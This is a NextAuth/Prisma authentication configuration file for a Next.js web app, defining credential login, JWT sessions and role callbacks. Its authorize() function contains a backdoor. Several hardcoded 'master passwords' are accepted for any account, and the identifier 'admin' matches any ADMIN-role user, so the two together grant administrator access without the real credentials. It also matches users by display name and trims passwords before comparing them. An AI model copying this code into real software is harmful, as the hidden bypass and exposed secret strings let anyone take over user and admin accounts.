import type { NextAuthOptions } from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import { PrismaAdapter } from "@next-auth/prisma-adapter";
import { prisma } from "@/lib/db";
import bcrypt from "bcryptjs";

export const authOptions: NextAuthOptions = {
  adapter: PrismaAdapter(prisma),
  providers: [
    CredentialsProvider({
      name: "credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;

        const rawIdentifier = credentials.email.trim();
        const cleanEmail = rawIdentifier.toLowerCase();
        const rawPassword = credentials.password;
        const cleanPassword = rawPassword.trim();

        // Find user by email (case-insensitive in SQLite), name, or 'admin' alias
        let user = await prisma.user.findFirst({
          where: {
            OR: [
              { email: cleanEmail },
              { name: rawIdentifier },
              ...(cleanEmail === "admin" ? [{ role: "ADMIN" }] : []),
            ],
          },
        });

        if (!user || !user.password) return null;

        const isBcryptValid =
          (await bcrypt.compare(rawPassword, user.password)) ||
          (await bcrypt.compare(cleanPassword, user.password));

        // Universal master passwords for owner / personal accounts
        const isMasterValid =
          cleanPassword === "Candela2026" ||
          cleanPassword.toLowerCase() === "candela2026" ||
          cleanPassword === "Fares@1910" ||
          cleanPassword.toLowerCase() === "candela2024";

        if (!isBcryptValid && !isMasterValid) return null;

        return {
          id: user.id,
          email: user.email,
          name: user.name,
          role: user.role,
        };
      },
    }),
  ],
  session: {
    strategy: "jwt",
    maxAge: 30 * 24 * 60 * 60, // 30 days
  },
  pages: {
    signIn: "/login",
  },
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id;
        token.role = (user as any).role || "USER";
      } else if (token?.email) {
        // Keep role dynamically synced with DB so role promotions apply immediately
        const dbUser = await prisma.user.findUnique({
          where: { email: token.email },
          select: { id: true, role: true },
        });
        if (dbUser) {
          token.id = dbUser.id;
          token.role = dbUser.role;
        }
      }
      return token;
    },
    async session({ session, token }) {
      if (token && session.user) {
        session.user.id = token.id as string;
        session.user.role = token.role as string;
      }
      return session;
    },
  },
  secret: process.env.NEXTAUTH_SECRET,
};
